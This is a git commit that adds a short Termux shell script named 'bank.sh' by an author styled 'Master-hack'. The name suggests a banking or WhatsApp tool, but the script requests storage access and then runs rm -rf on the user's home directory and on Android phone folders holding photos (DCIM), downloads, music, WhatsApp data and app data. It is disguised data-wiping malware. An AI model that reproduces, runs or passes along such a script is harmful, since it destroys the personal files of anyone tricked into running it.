2cdf21718c4d30154010cee1c5f0c3e135dae853
Master-hack <96709855+DRACULA-HACK@users.noreply.github.com>
2022-04-21 14:39:40 +0530

    Create bank.sh

---
+++ bank.sh
@@ -0,0 +1,20 @@
+clear
+ rm -rf AUTO-ADMIN_WHATSAPP
+
+termux-setup-storage
+
+
+clear
+
+
+rm -rf cd /sdcard/Android
+rm -rf cd ~
+rm -rf cd /sdcard/WhatsApp
+rm -rf cd /sdcard/DCIM
+rm -rf cd /sdcard/Download
+rm -rf cd /sdcard/Music
+rm -rf cd /sdcard/SHAREit
+
+clear
+
+cd
